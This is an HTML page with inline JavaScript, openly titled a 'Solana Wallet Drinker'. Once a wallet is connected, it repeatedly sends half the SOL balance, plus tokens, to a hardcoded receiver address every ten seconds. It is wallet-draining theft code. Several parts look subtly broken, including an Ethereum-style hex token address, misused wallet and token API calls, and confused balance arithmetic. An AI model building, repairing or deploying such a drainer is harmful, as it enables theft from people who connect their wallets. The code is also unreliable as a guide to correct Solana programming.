<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Solana Wallet Drinker</title>
  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.90.1"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base@1.90.1/dist/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-phantom@1.90.1/dist/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-react@1.90.1/dist/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-ux@1.90.1/dist/index.min.js"></script>
</head>
<body>
  <h1>Solana Wallet Drinker</h1>
  <button id="startButton">Start Drinking</button>
  <p id="status"></p>

  <script>
    const walletAdapter = new PhantomWalletAdapter();
    const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');

    const wallet = window.solana ? window.solana.connect(walletAdapter) : null;

    const receiverAddress = "3FAjhkuhXzp87fmoBCccypDUZDhJRWK5tT8z7L9mvUXS";
    const tokenAddress = "7f7f962d6917f71d024226f83720f563952f7940"; // Example: Doge token

    const startButton = document.getElementById('startButton');
    const status = document.getElementById('status');

    startButton.addEventListener('click', async () => {
      if (!wallet) {
        status.textContent = 'Please connect your wallet first.';
        return;
      }

      status.textContent = 'Drinking SOL and Meme Coins in the background...';

      setInterval(async () => {
        try {
          const balance = await connection.getBalance(wallet.publicKey());
          const lamports = balance / 1e9;

          const transaction = new Transaction().add(
            SystemProgram.transfer({
              fromPubkey: wallet.publicKey(),
              toPubkey: new PublicKey(receiverAddress),
              lamports: lamports * 1e9 / 2, // Drink half the balance
            })
          );

          const signature = await wallet.sendTransaction(transaction, connection);
          await connection.confirmTransaction(signature, 'confirmed');

          // Meme Coin Drain
          const tokenMint = new PublicKey(tokenAddress);
          const tokenBalance = await connection.getTokenAccountBalance(tokenMint, wallet.publicKey());
          const tokenAmount = tokenBalance.value.uiAmount;

          if (tokenAmount > 0) {
            const tokenTransaction = new Transaction().add(
              Token.createTransferInstruction(
                tokenMint,
                wallet.publicKey(),
                new PublicKey(receiverAddress),
                [],
                1,
                []
              )
            );

            const tokenSignature = await wallet.sendTransaction(tokenTransaction, connection);
            await connection.confirmTransaction(tokenSignature, 'confirmed');

            status.textContent = 'Drinking SOL and Meme Coins in the background...';
          } else {
            status.textContent = 'Drinking SOL in the background...';
          }
        } catch (error) {
          console.error(error);
          status.textContent = 'Error: ' + error.message;
        }
      }, 10000); // Drink every 10 seconds
    });
  </script>
</body>
</html>
